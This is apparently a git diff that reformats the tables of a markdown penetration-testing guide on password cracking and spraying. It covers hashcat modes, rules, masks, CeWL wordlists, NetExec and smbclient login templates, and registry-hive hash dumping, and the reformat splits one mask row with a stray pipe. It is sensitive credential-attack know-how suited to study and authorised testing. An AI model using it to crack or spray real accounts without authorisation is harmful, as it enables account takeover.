+| 29333 | TrueCrypt Whirlpool + XTS 1536 bit                              | Full-Disk Encryption (FDE)            |
+| 12200 | eCryptfs                                                        | Full-Disk Encryption (FDE)            |
+| 10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                                   | Document                              |
+| 10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1                      | Document                              |
+| 10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2                      | Document                              |
+| 10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                                   | Document                              |
+| 25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass             | Document                              |
+| 10600 | PDF 1.7 Level 3 (Acrobat 9)                                     | Document                              |
+| 10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                               | Document                              |
+|  9400 | MS Office 2007                                                  | Document                              |
+|  9500 | MS Office 2010                                                  | Document                              |
+|  9600 | MS Office 2013                                                  | Document                              |
+| 25300 | MS Office 2016 - SheetProtection                                | Document                              |
+|  9700 | MS Office <= 2003 $0/$1, MD5 + RC4                              | Document                              |
+|  9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1                 | Document                              |
+|  9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2                 | Document                              |
+|  9810 | MS Office <= 2003 $3, SHA1 + RC4, collider #1                   | Document                              |
+|  9820 | MS Office <= 2003 $3, SHA1 + RC4, collider #2                   | Document                              |
+|  9800 | MS Office <= 2003 $3/$4, SHA1 + RC4                             | Document                              |
+| 18400 | Open Document Format (ODF) 1.2 (SHA-256, AES)                   | Document                              |
+| 18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish)                | Document                              |
+| 16200 | Apple Secure Notes                                              | Document                              |
+| 23300 | Apple iWork                                                     | Document                              |
+|  6600 | 1Password, agilekeychain                                        | Password Manager                      |
+|  8200 | 1Password, cloudkeychain                                        | Password Manager                      |
+|  9000 | Password Safe v2                                                | Password Manager                      |
+|  5200 | Password Safe v3                                                | Password Manager                      |
+|  6800 | LastPass + LastPass sniffed                                     | Password Manager                      |
+| 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                     | Password Manager                      |
+| 29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager                      |
+| 23400 | Bitwarden                                                       | Password Manager                      |
+| 16900 | Ansible Vault                                                   | Password Manager                      |
+| 26000 | Mozilla key3.db                                                 | Password Manager                      |
+| 26100 | Mozilla key4.db                                                 | Password Manager                      |
+| 23100 | Apple Keychain                                                  | Password Manager                      |
+| 11600 | 7-Zip                                                           | Archive                               |
+| 12500 | RAR3-hp                                                         | Archive                               |
+| 23800 | RAR3-p (Compressed)                                             | Archive                               |
+| 23700 | RAR3-p (Uncompressed)                                           | Archive                               |
+| 13000 | RAR5                                                            | Archive                               |
+| 17220 | PKZIP (Compressed Multi-File)                                   | Archive                               |
+| 17200 | PKZIP (Compressed)                                              | Archive                               |
+| 17225 | PKZIP (Mixed Multi-File)                                        | Archive                               |
+| 17230 | PKZIP (Mixed Multi-File Checksum-Only)                          | Archive                               |
+| 17210 | PKZIP (Uncompressed)                                            | Archive                               |
+| 20500 | PKZIP Master Key                                                | Archive                               |
+| 20510 | PKZIP Master Key (6 byte optimization)                          | Archive                               |
+| 23001 | SecureZIP AES-128                                               | Archive                               |
+| 23002 | SecureZIP AES-192                                               | Archive                               |
+| 23003 | SecureZIP AES-256                                               | Archive                               |
+| 13600 | WinZip                                                          | Archive                               |
+| 18900 | Android Backup                                                  | Archive                               |
+| 24700 | Stuffit5                                                        | Archive                               |
+| 13200 | AxCrypt 1                                                       | Archive                               |
+| 13300 | AxCrypt 1 in-memory SHA1                                        | Archive                               |
+| 23500 | AxCrypt 2 AES-128                                               | Archive                               |
+| 23600 | AxCrypt 2 AES-256                                               | Archive                               |
+| 14700 | iTunes backup < 10.0                                            | Archive                               |
+| 14800 | iTunes backup >= 10.0                                           | Archive                               |
+|  8400 | WBB3 (Woltlab Burning Board)                                    | Forums, CMS, E-Commerce               |
+|  2612 | PHPS                                                            | Forums, CMS, E-Commerce               |
+|   121 | SMF (Simple Machines Forum) > v1.1                              | Forums, CMS, E-Commerce               |
+|  3711 | MediaWiki B type                                                | Forums, CMS, E-Commerce               |
+|  4521 | Redmine                                                         | Forums, CMS, E-Commerce               |
+| 24800 | Umbraco HMAC-SHA1                                               | Forums, CMS, E-Commerce               |
+|    11 | Joomla < 2.5.18                                                 | Forums, CMS, E-Commerce               |
+| 13900 | OpenCart                                                        | Forums, CMS, E-Commerce               |
+| 11000 | PrestaShop                                                      | Forums, CMS, E-Commerce               |
+| 16000 | Tripcode                                                        | Forums, CMS, E-Commerce               |
+|  7900 | Drupal7                                                         | Forums, CMS, E-Commerce               |
+|  4522 | PunBB                                                           | Forums, CMS, E-Commerce               |
+|  2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                         | Forums, CMS, E-Commerce               |
+|  2611 | vBulletin < v3.8.5                                              | Forums, CMS, E-Commerce               |
+|  2711 | vBulletin >= v3.8.5                                             | Forums, CMS, E-Commerce               |
+| 25600 | bcrypt(md5($pass)) / bcryptmd5                                  | Forums, CMS, E-Commerce               |
+| 25800 | bcrypt(sha1($pass)) / bcryptsha1                                | Forums, CMS, E-Commerce               |
+| 28400 | bcrypt(sha512($pass)) / bcryptsha512                            | Forums, CMS, E-Commerce               |
+|    21 | osCommerce, xt:Commerce                                         | Forums, CMS, E-Commerce               |
+| 18100 | TOTP (HMAC-SHA1)                                                | One-Time Password                     |
+|  2000 | STDOUT                                                          | Plaintext                             |
+| 99999 | Plaintext                                                       | Plaintext                             |
+| 21600 | Web2py pbkdf2-sha512                                            | Framework                             |
+| 10000 | Django (PBKDF2-SHA256)                                          | Framework                             |
+|   124 | Django (SHA-1)                                                  | Framework                             |
+| 12001 | Atlassian (PBKDF2-HMAC-SHA1)                                    | Framework                             |
+| 19500 | Ruby on Rails Restful-Authentication                            | Framework                             |
+| 27200 | Ruby on Rails Restful Auth (one round, no sitekey)              | Framework                             |
+| 30000 | Python Werkzeug MD5 (HMAC-MD5 (key = $salt))                    | Framework                             |
+| 30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt))              | Framework                             |
+| 20200 | Python passlib pbkdf2-sha512                                    | Framework                             |
+| 20300 | Python passlib pbkdf2-sha256                                    | Framework                             |
+| 20400 | Python passlib pbkdf2-sha1                                      | Framework                             |
+| 24410 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA1 + 3DES/AES)               | Private Key                           |
+| 24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)             | Private Key                           |
+| 15500 | JKS Java Key Store Private Keys (SHA1)                          | Private Key                           |
+| 22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                           | Private Key                           |
+| 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                           | Private Key                           |
+| 22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                       | Private Key                           |
+| 22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                           | Private Key                           |
+| 22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                           | Private Key                           |
+| 23200 | XMPP SCRAM PBKDF2-SHA1                                          | Instant Messaging Service             |
+| 28300 | Teamspeak 3 (channel hash)                                      | Instant Messaging Service             |
+| 22600 | Telegram Desktop < v2.1.14 (PBKDF2-HMAC-SHA1)                   | Instant Messaging Service             |
+| 24500 | Telegram Desktop >= v2.1.14 (PBKDF2-HMAC-SHA512)                | Instant Messaging Service             |
+| 22301 | Telegram Mobile App Passcode (SHA256)                           | Instant Messaging Service             |
+|    23 | Skype                                                           | Instant Messaging Service             |
+| 29600 | Terra Station Wallet (AES256-CBC(PBKDF2($pass)))                | Cryptocurrency Wallet                 |
+| 26600 | MetaMask Wallet                                                 | Cryptocurrency Wallet                 |
+| 21000 | BitShares v0.x - sha512(sha512_bin(pass))                       | Cryptocurrency Wallet                 |
+| 28501 | Bitcoin WIF private key (P2PKH), compressed                     | Cryptocurrency Wallet                 |
+| 28502 | Bitcoin WIF private key (P2PKH), uncompressed                   | Cryptocurrency Wallet                 |
+| 28503 | Bitcoin WIF private key (P2WPKH, Bech32), compressed            | Cryptocurrency Wallet                 |
+| 28504 | Bitcoin WIF private key (P2WPKH, Bech32), uncompressed          | Cryptocurrency Wallet                 |
+| 28505 | Bitcoin WIF private key (P2SH(P2WPKH)), compressed              | Cryptocurrency Wallet                 |
+| 28506 | Bitcoin WIF private key (P2SH(P2WPKH)), uncompressed            | Cryptocurrency Wallet                 |
+| 11300 | Bitcoin/Litecoin wallet.dat                                     | Cryptocurrency Wallet                 |
+| 16600 | Electrum Wallet (Salt-Type 1-3)                                 | Cryptocurrency Wallet                 |
+| 21700 | Electrum Wallet (Salt-Type 4)                                   | Cryptocurrency Wallet                 |
+| 21800 | Electrum Wallet (Salt-Type 5)                                   | Cryptocurrency Wallet                 |
+| 12700 | Blockchain, My Wallet                                           | Cryptocurrency Wallet                 |
+| 15200 | Blockchain, My Wallet, V2                                       | Cryptocurrency Wallet                 |
+| 18800 | Blockchain, My Wallet, Second Password (SHA256)                 | Cryptocurrency Wallet                 |
+| 25500 | Stargazer Stellar Wallet XLM                                    | Cryptocurrency Wallet                 |
+| 16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256                    | Cryptocurrency Wallet                 |
+| 15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                             | Cryptocurrency Wallet                 |
+| 15700 | Ethereum Wallet, SCRYPT                                         | Cryptocurrency Wallet                 |
+| 22500 | MultiBit Classic .key (MD5)                                     | Cryptocurrency Wallet                 |
+| 27700 | MultiBit Classic .wallet (scrypt)                               | Cryptocurrency Wallet                 |
+| 22700 | MultiBit HD (scrypt)                                            | Cryptocurrency Wallet                 |
+| 28200 | Exodus Desktop Wallet (scrypt)                                  | Cryptocurrency Wallet                 |
 
 </details>
 
 <details>
 <summary><h3>Hashcat Rules</h3></summary>
 
-| Rule File                          | Description                                                                 |
-|------------------------------------|-----------------------------------------------------------------------------|
-| `best64.rule`                     | Contains 64 of the most effective password mutation rules                   |
-| `combinator.rule`                 | Combines words from two dictionaries (pairwise combinations)                |
-| `d3ad0ne.rule`                    | Extensive rule set with complex transformations (origin unknown)            |
-| `dive.rule`                       | Very large rule set with deep mutation patterns                             |
-| `generated.rule`                  | Automatically generated rule set (basic version)                            |
-| `generated2.rule`                 | Expanded version of generated.rule with more variations                     |
-| `Incisive-leetspeak.rule`         | Advanced leet speak substitutions (e.g., a->4, e->3, etc.)                  |
-| `InsidePro-HashManager.rule`      | Rule set from InsidePro's HashManager tool                                  |
-| `InsidePro-PasswordsPro.rule`     | Rule set from InsidePro's PasswordsPro tool                                 |
-| `leetspeak.rule`                  | Basic leet speak character substitutions                                    |
-| `oscommerce.rule`                 | Specific rules targeting osCommerce password patterns                       |
-| `rockyou-30000.rule`              | Rule set derived from patterns in the rockyou.txt password list             |
-| `specific.rule`                   | Targeted rules for specific password mutation scenarios                     |
-| `T0XlC*` rules                    | Comprehensive rule sets with various insertion patterns (numbers, specials) |
-| `toggles1.rule`                   | Simple case toggle rules (minimal changes)                                  |
-| `toggles2-5.rule`                 | Progressively more complex case toggle combinations                         |
-| `unix-ninja-leetspeak.rule`       | Advanced leet speak rules from Unix-Ninja                                   |
+| Rule File                     | Description                                                                 |
+| ----------------------------- | --------------------------------------------------------------------------- |
+| `best64.rule`                 | Contains 64 of the most effective password mutation rules                   |
+| `combinator.rule`             | Combines words from two dictionaries (pairwise combinations)                |
+| `d3ad0ne.rule`                | Extensive rule set with complex transformations (origin unknown)            |
+| `dive.rule`                   | Very large rule set with deep mutation patterns                             |
+| `generated.rule`              | Automatically generated rule set (basic version)                            |
+| `generated2.rule`             | Expanded version of generated.rule with more variations                     |
+| `Incisive-leetspeak.rule`     | Advanced leet speak substitutions (e.g., a->4, e->3, etc.)                  |
+| `InsidePro-HashManager.rule`  | Rule set from InsidePro's HashManager tool                                  |
+| `InsidePro-PasswordsPro.rule` | Rule set from InsidePro's PasswordsPro tool                                 |
+| `leetspeak.rule`              | Basic leet speak character substitutions                                    |
+| `oscommerce.rule`             | Specific rules targeting osCommerce password patterns                       |
+| `rockyou-30000.rule`          | Rule set derived from patterns in the rockyou.txt password list             |
+| `specific.rule`               | Targeted rules for specific password mutation scenarios                     |
+| `T0XlC*` rules                | Comprehensive rule sets with various insertion patterns (numbers, specials) |
+| `toggles1.rule`               | Simple case toggle rules (minimal changes)                                  |
+| `toggles2-5.rule`             | Progressively more complex case toggle combinations                         |
+| `unix-ninja-leetspeak.rule`   | Advanced leet speak rules from Unix-Ninja                                   |
 
 > **NOTE:** : Hybrid rules are in the `/hybrid` subdirectory and combine multiple rule types
 
@@ -1421,33 +1417,33 @@ hashcat --attack-mode 3 --hash-type 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l
 <details>
 <summary><h3>Hashcat Masks</h3></summary>
 
-| Symbol | Charset Description                     | Example Characters                     |
-|--------|-----------------------------------------|----------------------------------------|
-| `?l`   | Lowercase ASCII letters                 | abcdefghijklmnopqrstuvwxyz            |
-| `?u`   | Uppercase ASCII letters                 | ABCDEFGHIJKLMNOPQRSTUVWXYZ            |
-| `?d`   | Digits                                  | 0123456789                            |
-| `?h`   | Lowercase hexadecimal digits            | 0123456789abcdef                      |
-| `?H`   | Uppercase hexadecimal digits            | 0123456789ABCDEF                      |
-| `?s`   | Special characters                      | !"#$%&'()*+,-./:;<=>?@[]^_\`{|}~   |
-| `?a`   | All printable ASCII (lower+upper+digits+special) | Equivalent to `?l?u?d?s`       |
-| `?b`   | All possible byte values (0x00-0xff)    | Non-printable characters included      |
+| Symbol | Charset Description                              | Example Characters                |
+| ------ | ------------------------------------------------ | --------------------------------- | --- |
+| `?l`   | Lowercase ASCII letters                          | abcdefghijklmnopqrstuvwxyz        |
+| `?u`   | Uppercase ASCII letters                          | ABCDEFGHIJKLMNOPQRSTUVWXYZ        |
+| `?d`   | Digits                                           | 0123456789                        |
+| `?h`   | Lowercase hexadecimal digits                     | 0123456789abcdef                  |
+| `?H`   | Uppercase hexadecimal digits                     | 0123456789ABCDEF                  |
+| `?s`   | Special characters                               | !"#$%&'()\*+,-./:;<=>?@[]^\_\`{   | }~  |
+| `?a`   | All printable ASCII (lower+upper+digits+special) | Equivalent to `?l?u?d?s`          |
+| `?b`   | All possible byte values (0x00-0xff)             | Non-printable characters included |
 
 </details>
 
 <details>
 <summary><h3>Hashcat Attack Modes</h3></summary>
 
-| Mode | Attack Name          | Description                                                                 |
-|------|----------------------|-----------------------------------------------------------------------------|
-| 0    | Straight/Dictionary  | Uses words from a dictionary file without modification                      |
-| 1    | Combination          | Combines words from multiple dictionaries (pairwise concatenation)          |
-| 3    | Brute-Force/Mask     | Generates passwords based on character sets and position patterns           |
-| 4    | Rule-Based           | Applies transformation rules to dictionary words (deprecated in v7+)        |
-| 5    | Markov-Chain         | Uses statistical models to generate password candidates (deprecated)        |
-| 6    | Hybrid Dict+Mask     | Appends mask patterns to each word from a dictionary                        |
-| 7    | Hybrid Mask+Dict     | Prepends mask patterns to each word from a dictionary                       |
-| 8    | Prince               | PRobability INfinite Chained Elements attack (advanced combinatorics)       |
-| 9    | Association          | Uses contextual information (like usernames) to generate attack rules       |
+| Mode | Attack Name         | Description                                                           |
+| ---- | ------------------- | --------------------------------------------------------------------- |
+| 0    | Straight/Dictionary | Uses words from a dictionary file without modification                |
+| 1    | Combination         | Combines words from multiple dictionaries (pairwise concatenation)    |
+| 3    | Brute-Force/Mask    | Generates passwords based on character sets and position patterns     |
+| 4    | Rule-Based          | Applies transformation rules to dictionary words (deprecated in v7+)  |
+| 5    | Markov-Chain        | Uses statistical models to generate password candidates (deprecated)  |
+| 6    | Hybrid Dict+Mask    | Appends mask patterns to each word from a dictionary                  |
+| 7    | Hybrid Mask+Dict    | Prepends mask patterns to each word from a dictionary                 |
+| 8    | Prince              | PRobability INfinite Chained Elements attack (advanced combinatorics) |
+| 9    | Association         | Uses contextual information (like usernames) to generate attack rules |
 
 1. **Most Common Attacks**: Modes 0 (dictionary) and 3 (mask) are most frequently used
 2. **Hybrid Attacks**: Modes 6 and 7 combine dictionary and mask approaches
@@ -1481,54 +1477,54 @@ Even basic OSINT (Open Source Intelligence) techniques can uncover this kind of 
 
 Commonly, users use the following additions for their password to fit the most common password policies:
 
-| **Description**                         | **Password Syntax**     |
-|----------------------------------------|--------------------------|
-| First letter is uppercase              | `Password`               |
-| Adding numbers                         | `Password123`            |
-| Adding year                            | `Password2022`           |
-| Adding month                           | `Password02`             |
-| Last character is an exclamation mark  | `Password2022!`          |
-| Adding special characters              | `P@ssw0rd2022!`          |
+| **Description**                       | **Password Syntax** |
+| ------------------------------------- | ------------------- |
+| First letter is uppercase             | `Password`          |
+| Adding numbers                        | `Password123`       |
+| Adding year                           | `Password2022`      |
+| Adding month                          | `Password02`        |
+| Last character is an exclamation mark | `Password2022!`     |
+| Adding special characters             | `P@ssw0rd2022!`     |
 
 <details>
 <summary><h3>Generating Wordlists using Hashcat</h3></summary>
 
 We can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. Hashcat uses a specific syntax to define characters, words, and their transformations.
 
-| **Name**             | **Function** | **Description**                                          | **Example Rule** | **Input Word** | **Output Word**        |
-|----------------------|--------------|----------------------------------------------------------|------------------|----------------|-------------------------|
-| Nothing              | :            | Do nothing (passthrough)                                | :                | p@ssW0rd       | p@ssW0rd               |
-| Lowercase            | l            | Lowercase all letters                                   | l                | p@ssW0rd       | p@ssw0rd               |
-| Uppercase            | u            | Uppercase all letters                                   | u                | p@ssW0rd       | P@SSW0RD               |
-| Capitalize           | c            | Capitalize first character, lowercase the rest          | c                | p@ssW0rd       | P@ssw0rd               |
-| Invert Capitalize    | C            | Lowercase first character, uppercase the rest           | C                | p@ssW0rd       | p@SSW0RD               |
-| Toggle Case          | t            | Toggle the case of all characters                       | t                | p@ssW0rd       | P@SSw0RD               |
-| Toggle @ N           | TN           | Toggle case at position N                               | T3               | p@ssW0rd       | p@sSW0rd               |
-| Reverse              | r            | Reverse the entire word                                 | r                | p@ssW0rd       | dr0Wss@p               |
-| Duplicate            | d            | Duplicate entire word                                   | d                | p@ssW0rd       | p@ssW0rdp@ssW0rd       |
-| Duplicate N          | pN           | Append duplicated word N times                          | p2               | p@ssW0rd       | p@ssW0rdp@ssW0rdp@ssW0rd |
-| Reflect              | f            | Duplicate word reversed                                 | f                | p@ssW0rd       | p@ssW0rddr0Wss@p       |
-| Rotate Left          | {            | Rotate the word left                                    | {                | p@ssW0rd       | @ssW0rdp               |
-| Rotate Right         | }            | Rotate the word right                                   | }                | p@ssW0rd       | dp@ssW0r               |
-| Append Character     | $X           | Append character X to end                               | $1$2             | p@ssW0rd       | p@ssW0rd12             |
-| Prepend Character    | ^X           | Prepend character X to front                            | ^2^1             | p@ssW0rd       | 12p@ssW0rd             |
-| Truncate left        | [            | Delete first character                                  | [                | p@ssW0rd       | @ssW0rd               |
-| Truncate right       | ]            | Delete last character                                   | ]                | p@ssW0rd       | p@ssW0r               |
-| Delete @ N           | DN           | Delete character at position N                          | D3               | p@ssW0rd       | p@sW0rd               |
-| Extract range        | xNM          | Extract M characters from position N                    | x04              | p@ssW0rd       | p@ss                  |
-| Omit range           | ONM          | Delete M characters from position N                     | O12              | p@ssW0rd       | psW0rd                |
-| Insert @ N           | iNX          | Insert character X at position N                        | i4!              | p@ssW0rd       | p@ss!W0rd             |
-| Overwrite @ N        | oNX          | Overwrite character at position N with X                | o3$              | p@ssW0rd       | p@s$W0rd              |
-| Truncate @ N         | 'N           | Truncate word at position N                             | '6               | p@ssW0rd       | p@ssW0                |
-| Replace              | sXY          | Replace all instances of X with Y                       | ss$              | p@ssW0rd       | p@$$W0rd              |
-| Purge                | @X           | Purge all instances of X                                | @s               | p@ssW0rd       | p@W0rd                |
-| Duplicate first N    | zN           | Duplicate first character N times                       | z2               | p@ssW0rd       | ppp@ssW0rd            |
-| Duplicate last N     | ZN           | Duplicate last character N times                        | Z2               | p@ssW0rd       | p@ssW0rddd            |
-| Duplicate all        | q            | Duplicate every character                               | q                | p@ssW0rd       | pp@@ssssWW00rrdd      |
-| Extract memory       | XNMI         | Insert substring of length M from position N of memory  | lMX428           | p@ssW0rd       | p@ssw0rdw0            |
-| Append memory        | 4            | Append word saved to memory                             | uMl4             | p@ssW0rd       | p@ssw0rdP@SSW0RD      |
-| Prepend memory       | 6            | Prepend word saved to memory                            | rMr6             | p@ssW0rd       | dr0Wss@pp@ssW0rd      |
-| Memorize             | M            | Memorize current word                                   | lMuX084          | p@ssW0rd       | P@SSp@ssw0rdW0RD      |
+| **Name**          | **Function** | **Description**                                        | **Example Rule** | **Input Word** | **Output Word**          |
+| ----------------- | ------------ | ------------------------------------------------------ | ---------------- | -------------- | ------------------------ |
+| Nothing           | :            | Do nothing (passthrough)                               | :                | p@ssW0rd       | p@ssW0rd                 |
+| Lowercase         | l            | Lowercase all letters                                  | l                | p@ssW0rd       | p@ssw0rd                 |
+| Uppercase         | u            | Uppercase all letters                                  | u                | p@ssW0rd       | P@SSW0RD                 |
+| Capitalize        | c            | Capitalize first character, lowercase the rest         | c                | p@ssW0rd       | P@ssw0rd                 |
+| Invert Capitalize | C            | Lowercase first character, uppercase the rest          | C                | p@ssW0rd       | p@SSW0RD                 |
+| Toggle Case       | t            | Toggle the case of all characters                      | t                | p@ssW0rd       | P@SSw0RD                 |
+| Toggle @ N        | TN           | Toggle case at position N                              | T3               | p@ssW0rd       | p@sSW0rd                 |
+| Reverse           | r            | Reverse the entire word                                | r                | p@ssW0rd       | dr0Wss@p                 |
+| Duplicate         | d            | Duplicate entire word                                  | d                | p@ssW0rd       | p@ssW0rdp@ssW0rd         |
+| Duplicate N       | pN           | Append duplicated word N times                         | p2               | p@ssW0rd       | p@ssW0rdp@ssW0rdp@ssW0rd |
+| Reflect           | f            | Duplicate word reversed                                | f                | p@ssW0rd       | p@ssW0rddr0Wss@p         |
+| Rotate Left       | {            | Rotate the word left                                   | {                | p@ssW0rd       | @ssW0rdp                 |
+| Rotate Right      | }            | Rotate the word right                                  | }                | p@ssW0rd       | dp@ssW0r                 |
+| Append Character  | $X           | Append character X to end                              | $1$2             | p@ssW0rd       | p@ssW0rd12               |
+| Prepend Character | ^X           | Prepend character X to front                           | ^2^1             | p@ssW0rd       | 12p@ssW0rd               |
+| Truncate left     | [            | Delete first character                                 | [                | p@ssW0rd       | @ssW0rd                  |
+| Truncate right    | ]            | Delete last character                                  | ]                | p@ssW0rd       | p@ssW0r                  |
+| Delete @ N        | DN           | Delete character at position N                         | D3               | p@ssW0rd       | p@sW0rd                  |
+| Extract range     | xNM          | Extract M characters from position N                   | x04              | p@ssW0rd       | p@ss                     |
+| Omit range        | ONM          | Delete M characters from position N                    | O12              | p@ssW0rd       | psW0rd                   |
+| Insert @ N        | iNX          | Insert character X at position N                       | i4!              | p@ssW0rd       | p@ss!W0rd                |
+| Overwrite @ N     | oNX          | Overwrite character at position N with X               | o3$              | p@ssW0rd       | p@s$W0rd                 |
+| Truncate @ N      | 'N           | Truncate word at position N                            | '6               | p@ssW0rd       | p@ssW0                   |
+| Replace           | sXY          | Replace all instances of X with Y                      | ss$              | p@ssW0rd       | p@$$W0rd                 |
+| Purge             | @X           | Purge all instances of X                               | @s               | p@ssW0rd       | p@W0rd                   |
+| Duplicate first N | zN           | Duplicate first character N times                      | z2               | p@ssW0rd       | ppp@ssW0rd               |
+| Duplicate last N  | ZN           | Duplicate last character N times                       | Z2               | p@ssW0rd       | p@ssW0rddd               |
+| Duplicate all     | q            | Duplicate every character                              | q                | p@ssW0rd       | pp@@ssssWW00rrdd         |
+| Extract memory    | XNMI         | Insert substring of length M from position N of memory | lMX428           | p@ssW0rd       | p@ssw0rdw0               |
+| Append memory     | 4            | Append word saved to memory                            | uMl4             | p@ssW0rd       | p@ssw0rdP@SSW0RD         |
+| Prepend memory    | 6            | Prepend word saved to memory                           | rMr6             | p@ssW0rd       | dr0Wss@pp@ssW0rd         |
+| Memorize          | M            | Memorize current word                                  | lMuX084          | p@ssW0rd       | P@SSp@ssw0rdW0RD         |
 
 Each rule is written on a new line and determines how a given word should be transformed.
 
@@ -1653,24 +1649,24 @@ P@ssw0rd!
 
 We can use a tool called CeWL to scan potential words from a company's website and save them in a list. We can then combine this list with the desired rules to create a customized password list—one that has a higher probability of containing the correct password for an employee.
 
-| **Option(s)**                     | **Argument**     | **Description**                                                  | **Default** |
-|----------------------------------|------------------|------------------------------------------------------------------|-------------|
-| `-h`, `--help`                   | —                | Show help.                                                       | —           |
-| `-k`, `--keep`                   | —                | Keep the downloaded file.                                        | —           |
-| `-d`, `--depth`                  | `<x>`            | Depth to spider to.                                              | 2           |
-| `-m`, `--min_word_length`        | —                | Minimum word length.                                             | 3           |
-| `-o`, `--offsite`                | —                | Let the spider visit other sites.                                | —           |
-| `-w`, `--write`                  | —                | Write the output to the file.                                    | —           |
-| `-u`, `--ua`                     | `<agent>`        | User agent to send.                                              | —           |
-| `-n`, `--no-words`               | —                | Don't output the wordlist.                                       | —           |
-| `-a`, `--meta`                   | —                | Include meta data.                                               | —           |
-| `--meta_file`                    | `<file>`         | Output file for meta data.                                       | —           |
-| `-e`, `--email`                  | —                | Include email addresses.                                         | —           |
-| `--email_file`                   | `<file>`         | Output file for email addresses.                                 | —           |
-| `--meta-temp-dir`                | `<dir>`          | Temporary dir used by exiftool when parsing files.               | `/tmp`      |
-| `-c`, `--count`                  | —                | Show the count for each word found.                              | —           |
-| `-v`, `--verbose`                | —                | Verbose output.                                                  | —           |
-| `--debug`                        | —                | Extra debug information.                                         | —           |
+| **Option(s)**             | **Argument** | **Description**                                    | **Default** |
+| ------------------------- | ------------ | -------------------------------------------------- | ----------- |
+| `-h`, `--help`            | —            | Show help.                                         | —           |
+| `-k`, `--keep`            | —            | Keep the downloaded file.                          | —           |
+| `-d`, `--depth`           | `<x>`        | Depth to spider to.                                | 2           |
+| `-m`, `--min_word_length` | —            | Minimum word length.                               | 3           |
+| `-o`, `--offsite`         | —            | Let the spider visit other sites.                  | —           |
+| `-w`, `--write`           | —            | Write the output to the file.                      | —           |
+| `-u`, `--ua`              | `<agent>`    | User agent to send.                                | —           |
+| `-n`, `--no-words`        | —            | Don't output the wordlist.                         | —           |
+| `-a`, `--meta`            | —            | Include meta data.                                 | —           |
+| `--meta_file`             | `<file>`     | Output file for meta data.                         | —           |
+| `-e`, `--email`           | —            | Include email addresses.                           | —           |
+| `--email_file`            | `<file>`     | Output file for email addresses.                   | —           |
+| `--meta-temp-dir`         | `<dir>`      | Temporary dir used by exiftool when parsing files. | `/tmp`      |
+| `-c`, `--count`           | —            | Show the count for each word found.                | —           |
+| `-v`, `--verbose`         | —            | Verbose output.                                    | —           |
+| `--debug`                 | —            | Extra debug information.                           | —           |
 
 **Example**
 
@@ -2475,15 +2471,15 @@ netexec -h
 
 **NetExec Available Protocols**
 
-* MSSQL
-* WinRM
-* LDAP
-* SMB
-* SSH
-* VNC
-* WMI
-* FTP
-* RDP
+- MSSQL
+- WinRM
+- LDAP
+- SMB
+- SSH
+- VNC
+- WMI
+- FTP
+- RDP
 
 **NetExec Protocol-Specific Help**
 
@@ -2541,7 +2537,7 @@ netexec <PROTOCOL> <TARGET_IP> -u <USER> -p <PASSWORD>
 
 [WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) is Microsoft's implementation of the [WS-Management protocol](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol), providing a standardized framework for remote Windows system administration.
 
-<!-- 
+<!--
 **1. Functional Capabilities**
 
 * Remote command execution
@@ -2990,30 +2986,30 @@ smbclient -U <USER> \\\\<TARGET_IP>\\<SHARENAME>
 <details>
 <summary><h3>Password spraying</h3></summary>
 
-Password spraying is a credential-based attack where a single password is tested against multiple user accounts before moving to the next password. 
+Password spraying is a credential-based attack where a single password is tested against multiple user accounts before moving to the next password.
 
 This technique:
 
-* Avoids account lockouts by spacing attempts
+- Avoids account lockouts by spacing attempts
 
-* Exploits weak organizational password policies
+- Exploits weak organizational password policies
 
-* Targets default/initial passwords (e.g., CompanyName123, Welcome1)
+- Targets default/initial passwords (e.g., CompanyName123, Welcome1)
 
 High-risk scenarios:
 
-* Default credentials in onboarding processes  
+- Default credentials in onboarding processes
 
-* Password reuse across departments  
+- Password reuse across departments
 
-* Lack of multi-factor authentication (MFA)
+- Lack of multi-factor authentication (MFA)
 
-| Target Environment       | Recommended Tools                          | Protocol/Port Focus        |
-|--------------------------|--------------------------------------------|---------------------------|
-| Web Applications         | Burp Suite Intruder, OWASP ZAP             | HTTP/HTTPS (80, 443)      |
-| Active Directory         | NetExec, Kerbrute                          | LDAP/SMB (389, 445)       |
-| Cloud Services           | MSOLSpray, Okta API scripts                | REST APIs (443)           |
-| Legacy Systems           | Hydra, Metasploit auxiliary modules        | SSH/RDP (22, 3389)        |
+| Target Environment | Recommended Tools                   | Protocol/Port Focus  |
+| ------------------ | ----------------------------------- | -------------------- |
+| Web Applications   | Burp Suite Intruder, OWASP ZAP      | HTTP/HTTPS (80, 443) |
+| Active Directory   | NetExec, Kerbrute                   | LDAP/SMB (389, 445)  |
+| Cloud Services     | MSOLSpray, Okta API scripts         | REST APIs (443)      |
+| Legacy Systems     | Hydra, Metasploit auxiliary modules | SSH/RDP (22, 3389)   |
 
 **Example**
 
@@ -3193,15 +3189,15 @@ With administrative access to a Windows system, we can attempt to quickly dump t
 
 There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.
 
-| Registry Hive   | Description |
-|----------------|-------------|
